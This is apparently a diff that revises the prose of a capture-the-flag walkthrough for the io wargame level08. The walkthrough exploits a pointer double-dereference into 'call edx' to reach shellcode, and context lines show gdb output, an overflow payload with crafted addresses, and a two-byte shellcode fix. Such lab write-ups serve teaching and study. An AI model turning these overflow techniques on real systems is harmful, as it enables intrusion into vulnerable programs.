@@ -63,7 +63,7 @@ Dump of assembler code for function main:
    0x08048737 <+163>:   call   edx
 ```
 
-We're moving a pointer off the stack into eax, dereferencing it once and storing the result in eax, then dereferencing it again and storing it edx. A few instructions down we then call edx, so we can control where we jump. We need to successfully pass the first deref and then make the second deref to set up edx to jump to our shellcode. So we need to know the offset, control the first deref, and make it so the second deref points to our shellcode. Let's find the offset first.
+We're deref'ing a pointer off the stack and storing the result in eax, deref'ing eax once and storing the result back in eax, then deref'ing it again and storing it edx. A few instructions down we then call edx, so we can control where we jump. We need to successfully pass the first deref and then make the second deref set up edx to jump to our shellcode. So we need to know the offset, control the first deref, and make it so the second deref points to our shellcode. Let's find the offset first.
 ```
 [1]+  Stopped                 gdb -q ./level08
 level8@io:/levels$ python
@@ -164,7 +164,7 @@ Breakpoint 1, 0x08048720 in main ()
 0x804a0b8:    0x43434343  0x43434343  0x43434343  0x43434343
 ```
 
-So we're about to deref 0x42424242. We should make it deref eax+4 (0x804a07c) so that eax ends up pointing to 0x43434343. Then we can replace those four Cs with eax+8 (0x804a080). And we can have our shellcode follow right afterwards because these addresses remain static. Let's replace those eight bytes and see how it works out.
+So we're about to deref 0x42424242. We should make it deref eax+4 (0x804a07c) so that eax ends up pointing to 0x43434343. Then we can replace those four Cs with eax+8 (0x804a080). And we can have our shellcode follow right afterwards because these addresses are static. Let's replace those eight bytes and see how it works out.
 ```
 (gdb) run $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "C"*100')
 The program being debugged has been started already.
@@ -329,7 +329,7 @@ Program received signal SIGSEGV, Segmentation fault.
    0x804a0a9:   add    BYTE PTR [eax],al
 ```
 
-Our shellcode ran but we didn't get a shell... instead we got a seg fault again. Well to save some space and time (because this isn't a shellcode walkthrough), our shellcode doesn't zero out edx. So when it makes our execve syscall, edx (being treated as the third argument of char **envp) causes the syscall to fail because that's not a valid pointer and trying to deref it causes an error. To fix the issue, add these two bytes to the start of the shellcode: "\x33\xd2". When we add this, this is the result.
+Our shellcode ran but we didn't get a shell... instead we got a seg fault again. Well to save some space and time (because this isn't a shellcode walkthrough), our shellcode doesn't zero out edx. So when it makes our execve syscall, edx (being treated as the third argument of execve: char *envp[]) causes the syscall to fail because that's not a valid pointer and trying to deref it causes an exception. To fix the issue, add these two bytes to the start of the shellcode: "\x33\xd2". These are the bytes for the `xor edx, edx` instruction. When we add this, this is the result.
 ```
 level8@io:/levels$ gdb -q ./level08
 Reading symbols from /levels/level08...(no debugging symbols found)...done.
